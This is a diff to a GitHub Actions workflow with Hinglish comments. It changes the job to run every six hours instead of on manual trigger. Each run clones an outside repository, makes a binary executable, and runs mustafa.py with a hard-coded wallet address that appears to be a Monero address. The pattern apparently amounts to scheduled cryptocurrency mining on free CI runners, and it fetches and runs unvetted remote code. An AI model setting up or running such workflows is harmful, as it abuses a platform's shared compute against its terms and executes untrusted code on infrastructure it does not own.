@@ -1,15 +1,13 @@
-name: Mustu Setup Automation
+name: Auto Mustu Setup
 
 on:
-  workflow_dispatch:
-    inputs:
-      wallet:
-        description: 'Wallet address'
-        required: true
-        default: '43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN'
+  schedule:
+    # Har 6 ghante mein run karega (aap chahein to time change kar sakte hain)
+    - cron: '0 */6 * * *'
+  workflow_dispatch:  # Manual run ke liye bhi option rakh raha hoon
 
 jobs:
-  setup:
+  auto-setup:
     runs-on: ubuntu-latest
     
     steps:
@@ -21,17 +19,24 @@ jobs:
       with:
         python-version: '3.10'
     
-    - name: Git clone mustu-setup
+    - name: Install dependencies
+      run: |
+        pip install --upgrade pip
+        # Agar mustafa.py ko koi library chahiye to yahan add karein
+    
+    - name: Git clone and run
       run: |
         git clone https://github.com/thumpingpp/mustu-setup.git
-    
-    - name: Change directory and set permissions
-      run: |
         cd mustu-setup
         chmod +x mustafa
-        python3 mustafa.py ${{ github.event.inputs.wallet }}
+        python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
     
-    - name: Display output
-      if: always()
+    - name: Log completion
       run: |
-        echo "Process completed for wallet: ${{ github.event.inputs.wallet }}"
+        echo "Auto setup completed at $(date)" >> setup_log.txt
+    
+    - name: Upload log
+      uses: actions/upload-artifact@v3
+      with:
+        name: setup-logs
+        path: setup_log.txt
